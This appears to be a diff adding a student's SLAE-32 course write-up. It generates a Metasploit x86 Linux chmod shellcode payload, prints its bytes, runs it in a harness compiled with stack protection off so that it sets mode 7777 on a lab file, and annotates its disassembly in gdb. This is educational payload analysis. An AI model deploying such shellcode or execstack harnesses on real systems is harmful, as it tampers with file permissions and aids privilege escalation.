@@ -1,0 +1,104 @@
+Step 1 # prepare for analysis 
+
+root@kali:/home/SLAE/Assignment5# cat task3.txt 
+This is CHMOD example for Assignment 5
+W00TW00T
+SLAE-32 is a nice course...
+
+root@kali:/home/SLAE/Assignment5# chown root:root task3.txt
+root@kali:/home/SLAE/Assignment5# ls -la task3.txt 
+-rw-r--r-- 1 root root 77 Feb 10 13:50 task3.txt
+root@kali:/home/SLAE/Assignment5# msfvenom -p linux/x86/chmod File=/home/SLAE/Assignment5/task3.txt MODE=7777 -f c -a x86 --platform linux
+No encoder or badchars specified, outputting raw payload
+Payload size: 57 bytes
+unsigned char buf[] = 
+"\x99\x6a\x0f\x58\x52\xe8\x21\x00\x00\x00\x2f\x68\x6f\x6d\x65"
+"\x2f\x53\x4c\x41\x45\x2f\x41\x73\x73\x69\x67\x6e\x6d\x65\x6e"
+"\x74\x35\x2f\x74\x61\x73\x6b\x33\x2e\x74\x78\x74\x00\x5b\x68"
+"\xff\x0f\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80";
+root@kali:/home/SLAE/Assignment5# vi chmod_shellcode.c
+root@kali:/home/SLAE/Assignment5# gcc -fno-stack-protector -z execstack chmod_shellcode.c -o chmod_shellcode
+root@kali:/home/SLAE/Assignment5# 
+root@kali:/home/SLAE/Assignment5# ls -la task3.txt
+-rw-r--r-- 1 root root 77 Feb 10 13:50 task3.txt
+root@kali:/home/SLAE/Assignment5# 
+root@kali:/home/SLAE/Assignment5# ./chmod_shellcode 
+Shellcode Length:  7
+root@kali:/home/SLAE/Assignment5# ls -la task3.txt
+-rwsrwsrwt 1 root root 77 Feb 10 13:50 task3.txt
+root@kali:/home/SLAE/Assignment5# 
+
+
+Step 2: GDB analysis 
+
+root@kali:/home/SLAE/Assignment5# gdb -q chmod_shellcode
+Reading symbols from chmod_shellcode...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) break *&code
+Breakpoint 1 at 0x8049740
+(gdb) run
+Starting program: /home/SLAE/Assignment5/chmod_shellcode 
+Shellcode Length:  7
+
+Breakpoint 1, 0x08049740 in code ()
+(gdb) disassemble 
+Dump of assembler code for function code:
+=> 0x08049740 <+0>:	cdq    
+   0x08049741 <+1>:	push   0xf
+   0x08049743 <+3>:	pop    eax
+   0x08049744 <+4>:	push   edx
+   0x08049745 <+5>:	call   0x804976b <code+43>
+   0x0804974a <+10>:	das    
+   0x0804974b <+11>:	push   0x2f656d6f
+   0x08049750 <+16>:	push   ebx
+   0x08049751 <+17>:	dec    esp
+   0x08049752 <+18>:	inc    ecx
+   0x08049753 <+19>:	inc    ebp
+   0x08049754 <+20>:	das    
+   0x08049755 <+21>:	inc    ecx
+   0x08049756 <+22>:	jae    0x80497cb
+   0x08049758 <+24>:	imul   esp,DWORD PTR [edi+0x6e],0x746e656d
+   0x0804975f <+31>:	xor    eax,0x7361742f
+   0x08049764 <+36>:	imul   esi,DWORD PTR [ebx],0x2e
+   0x08049767 <+39>:	je     0x80497e1
+   0x08049769 <+41>:	je     0x804976b <code+43>
+   0x0804976b <+43>:	pop    ebx
+   0x0804976c <+44>:	push   0xfff
+   0x08049771 <+49>:	pop    ecx
+   0x08049772 <+50>:	int    0x80
+   0x08049774 <+52>:	push   0x1
+   0x08049776 <+54>:	pop    eax
+   0x08049777 <+55>:	int    0x80
+   0x08049779 <+57>:	add    BYTE PTR [eax],al
+End of assembler dump.
+(gdb) 
+
+Step 3: Analysis  (comment on code).
+
+cdq    ; edx = 0
+push   0xf                 ; #define __NR_chmod 15
+pop    eax                 ; eax = int chmod(const char *path, mode_t mode);
+push   edx                 ;push NULL dword on the stack
+call   0x804976b <code+43> ;  This is the PAYLOAD address on the stack
+das    
+push   0x2f656d6f
+push   ebx
+dec    esp
+inc    ecx
+inc    ebp
+das    
+inc    ecx
+jae    0x80497cb            ;task3.txt
+imul   esp,DWORD PTR [edi+0x6e],0x746e656d
+xor    eax,0x7361742f
+imul   esi,DWORD PTR [ebx],0x2e
+je     0x80497e1
+je     0x804976b <code+43>
+pop    ebx                 ; ebx = EIP return address
+push   0xfff               ;octal on the stack
+pop    ecx
+int    0x80                ;chmod execution the file
+push   0x1                 ;#define __NR_exit 1
+pop    eax
+int    0x80                ;exit
+ 
